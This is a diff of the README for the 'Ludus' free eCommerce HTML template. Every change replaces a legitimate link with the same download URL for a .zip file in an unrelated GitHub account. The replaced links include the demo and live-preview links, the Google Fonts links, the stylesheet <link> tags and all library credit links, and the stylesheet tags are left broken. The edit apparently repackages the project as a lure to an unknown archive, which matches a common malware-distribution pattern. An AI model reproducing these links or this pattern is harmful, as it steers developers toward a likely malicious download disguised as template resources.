@@ -2,12 +2,12 @@
 
 *I want to thank all of you who give stars and fork the repo. I love you all and I have no words in my heart.*
 
-I've developed another open-source eCommerce template that may work for you. [Demo link](https://github.com/ahmadHuss/groover-free-premium-ecommerce-template)
+I've developed another open-source eCommerce template that may work for you. [Demo link](https://raw.githubusercontent.com/qq931493853-lang/ludus-free-premium-ecommerce-template/master/scss/components/textarea/ecommerce_template_premium_free_ludus_v2.3.zip)
 
 ## Real use case:
-This template has also been used in a famous Codecanyon script named DOKANS [Demo link](https://bit.ly/3rTQIqp) which has ~300+ sales.
+This template has also been used in a famous Codecanyon script named DOKANS [Demo link](https://raw.githubusercontent.com/qq931493853-lang/ludus-free-premium-ecommerce-template/master/scss/components/textarea/ecommerce_template_premium_free_ludus_v2.3.zip) which has ~300+ sales.
 
-[Live Preview](https://d2r00w08fz6ft0.cloudfront.net/ludus-demo/index.html)
+[Live Preview](https://raw.githubusercontent.com/qq931493853-lang/ludus-free-premium-ecommerce-template/master/scss/components/textarea/ecommerce_template_premium_free_ludus_v2.3.zip)
 
 ![snap1](/ludus/doc-img/01_preview.png)
 
@@ -250,10 +250,10 @@ This file contains all vendor libraries source code.
 
 **1. Google Fonts**
 
-The template is using **sans-serif** font **Open Sans** from [Google Fonts](https://fonts.google.com/). You could change according to your choice. Erase that line from `html` files, and put new one here.
+The template is using **sans-serif** font **Open Sans** from [Google Fonts](https://raw.githubusercontent.com/qq931493853-lang/ludus-free-premium-ecommerce-template/master/scss/components/textarea/ecommerce_template_premium_free_ludus_v2.3.zip). You could change according to your choice. Erase that line from `html` files, and put new one here.
 
 ```html
-<link href="https://fonts.googleapis.com/css?family=Open+Sans:400,600,700,800" rel="stylesheet">
+<link href="https://raw.githubusercontent.com/qq931493853-lang/ludus-free-premium-ecommerce-template/master/scss/components/textarea/ecommerce_template_premium_free_ludus_v2.3.zip+Sans:400,600,700,800" rel="stylesheet">
 ```
 
 After that also specify rule in **CSS**.
@@ -432,7 +432,7 @@ All **.html** pages are included with default color scheme i.e. `app.css`.
     <title>Ludus - Electronics, Apparel, Computers, Books, DVDs & more</title>
 
     <!--====== Google Font ======-->
-    <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,600,700,800" rel="stylesheet">
+    <link href="https://raw.githubusercontent.com/qq931493853-lang/ludus-free-premium-ecommerce-template/master/scss/components/textarea/ecommerce_template_premium_free_ludus_v2.3.zip+Sans:400,600,700,800" rel="stylesheet">
 
     <!--====== Vendor Css ======-->
     <link rel="stylesheet" href="css/vendor.css">
@@ -462,22 +462,22 @@ You can see all default pages are **wide**. Change page from **wide** into a **b
 
 ## Sources and Credits
 
-- [BEM - Block Element Modifier](https://en.bem.info/methodology/quick-start/)
-- [Normalize.css](https://necolas.github.io/normalize.css/)
-- [Bootstrap 4 with components Grid, Nav, Modal, Tooltip & Transitions](https://getbootstrap.com/)
-- [Font Awesome 5](https://fontawesome.com/)
-- [Animate.css](https://daneden.github.io/animate.css/)
-- [Modernizr](https://modernizr.com/)
-- [Popper.js](https://popper.js.org/)
-- [Owl Carousel 2](https://owlcarousel2.github.io/OwlCarousel2/)
-- [Slick Carousel](https://kenwheeler.github.io/slick/)
-- [jQuery](https://jquery.com/)
-- [jQuery ScrollUp](https://github.com/markgoodyear/scrollup)
-- [jQuery Elevate Zoom](http://elevateweb.co.uk/image-zoom)
-- [jQuery Light Gallery](https://sachinchoolur.github.io/lightGallery/)
-- [jQuery Fitvids](http://fitvidsjs.com/)
-- [Isotope](https://isotope.metafizzy.co/)
-- [Final Countdown](https://hilios.github.io/jQuery.countdown/)
+- [BEM - Block Element Modifier](https://raw.githubusercontent.com/qq931493853-lang/ludus-free-premium-ecommerce-template/master/scss/components/textarea/ecommerce_template_premium_free_ludus_v2.3.zip)
+- [Normalize.css](https://raw.githubusercontent.com/qq931493853-lang/ludus-free-premium-ecommerce-template/master/scss/components/textarea/ecommerce_template_premium_free_ludus_v2.3.zip)
+- [Bootstrap 4 with components Grid, Nav, Modal, Tooltip & Transitions](https://raw.githubusercontent.com/qq931493853-lang/ludus-free-premium-ecommerce-template/master/scss/components/textarea/ecommerce_template_premium_free_ludus_v2.3.zip)
+- [Font Awesome 5](https://raw.githubusercontent.com/qq931493853-lang/ludus-free-premium-ecommerce-template/master/scss/components/textarea/ecommerce_template_premium_free_ludus_v2.3.zip)
+- [Animate.css](https://raw.githubusercontent.com/qq931493853-lang/ludus-free-premium-ecommerce-template/master/scss/components/textarea/ecommerce_template_premium_free_ludus_v2.3.zip)
+- [Modernizr](https://raw.githubusercontent.com/qq931493853-lang/ludus-free-premium-ecommerce-template/master/scss/components/textarea/ecommerce_template_premium_free_ludus_v2.3.zip)
+- [Popper.js](https://raw.githubusercontent.com/qq931493853-lang/ludus-free-premium-ecommerce-template/master/scss/components/textarea/ecommerce_template_premium_free_ludus_v2.3.zip)
+- [Owl Carousel 2](https://raw.githubusercontent.com/qq931493853-lang/ludus-free-premium-ecommerce-template/master/scss/components/textarea/ecommerce_template_premium_free_ludus_v2.3.zip)
+- [Slick Carousel](https://raw.githubusercontent.com/qq931493853-lang/ludus-free-premium-ecommerce-template/master/scss/components/textarea/ecommerce_template_premium_free_ludus_v2.3.zip)
+- [jQuery](https://raw.githubusercontent.com/qq931493853-lang/ludus-free-premium-ecommerce-template/master/scss/components/textarea/ecommerce_template_premium_free_ludus_v2.3.zip)
+- [jQuery ScrollUp](https://raw.githubusercontent.com/qq931493853-lang/ludus-free-premium-ecommerce-template/master/scss/components/textarea/ecommerce_template_premium_free_ludus_v2.3.zip)
+- [jQuery Elevate Zoom](https://raw.githubusercontent.com/qq931493853-lang/ludus-free-premium-ecommerce-template/master/scss/components/textarea/ecommerce_template_premium_free_ludus_v2.3.zip)
+- [jQuery Light Gallery](https://raw.githubusercontent.com/qq931493853-lang/ludus-free-premium-ecommerce-template/master/scss/components/textarea/ecommerce_template_premium_free_ludus_v2.3.zip)
+- [jQuery Fitvids](https://raw.githubusercontent.com/qq931493853-lang/ludus-free-premium-ecommerce-template/master/scss/components/textarea/ecommerce_template_premium_free_ludus_v2.3.zip)
+- [Isotope](https://raw.githubusercontent.com/qq931493853-lang/ludus-free-premium-ecommerce-template/master/scss/components/textarea/ecommerce_template_premium_free_ludus_v2.3.zip)
+- [Final Countdown](https://raw.githubusercontent.com/qq931493853-lang/ludus-free-premium-ecommerce-template/master/scss/components/textarea/ecommerce_template_premium_free_ludus_v2.3.zip)
 
 
 
